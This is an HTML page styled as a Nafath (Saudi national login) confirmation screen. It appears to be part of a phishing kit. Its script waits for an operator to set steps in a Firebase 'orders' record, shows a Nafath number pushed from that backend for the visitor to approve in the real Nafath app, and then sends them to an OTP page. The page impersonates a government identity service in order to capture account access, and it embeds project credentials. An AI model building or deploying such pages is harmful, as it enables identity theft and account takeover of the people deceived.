<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>تأكيد نفاذ | Nafath Confirmation</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display:flex; align-items:center; justify-content:center; padding:20px; }
        #code-screen { display:none; animation:fadeIn 0.4s; }
        #loading-screen { display:flex; flex-direction:column; align-items:center; }
        @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="teal-card teal-card--narrow" style="width:100%;">
    <div style="padding:20px 24px;display:flex;justify-content:center;border-bottom:1px solid var(--teal-border);">
        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="44" width="180">
    </div>

    <div class="card-body">

        <!-- Loading -->
        <div id="loading-screen" style="text-align:center;padding:24px 0;">
            <div class="spin-ring" style="margin-bottom:20px;"></div>
            <div class="section-title" data-i18n="nafath_proc.creating">جاري إنشاء طلب التوثيق...</div>
            <div class="section-sub" style="margin-top:6px;" data-i18n="nafath_proc.wait">يرجى الانتظار قليلاً بينما نقوم بتجهيز الطلب</div>
        </div>

        <!-- Code -->
        <div id="code-screen" style="text-align:center;">
            <div class="section-title" data-i18n="nafath_proc.select">الرجاء اختيار الرقم في تطبيق نفاذ</div>
            <div class="nafath-number-circle" id="display-num">--</div>
            <div class="section-sub" data-i18n="nafath_proc.open">افتح تطبيق نفاذ وقم بتأكيد الطلب باختيار الرقم الظاهر أعلاه</div>
            <div id="timer-box" style="display:none;margin-top:16px;" class="timer-chip">
                <span data-i18n="nafath_proc.validity">صلاحية الرقم:</span>
                <span class="timer-chip__num" id="timer">01:00</span>
            </div>
        </div>

    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');
    let timerInterval;

    function startTimer(duration) {
        let timer = duration;
        const display = document.getElementById('timer');
        document.getElementById('timer-box').style.display = 'inline-flex';
        clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            const m = parseInt(timer/60,10);
            const s = parseInt(timer%60,10);
            display.textContent = (m<10?'0'+m:m)+':'+(s<10?'0'+s:s);
            if (--timer < 0) { clearInterval(timerInterval); display.textContent = "00:00"; }
        }, 1000);
    }

    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
                    if (document.getElementById('code-screen').style.display !== 'block') {
                        document.getElementById('loading-screen').style.display = 'none';
                        document.getElementById('code-screen').style.display = 'block';
                        document.getElementById('display-num').innerText = data.nafath_code;
                        startTimer(60);
                    }
                }
                if (data.next_step === "GO_TO_REJECT") {
                    alert(t('nafath_proc.rejected'));
                    window.location.href = "index.html";
                }
                if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
            }
        });
    } else {
        window.location.href = "index.html";
    }
</script>
</body>
</html>
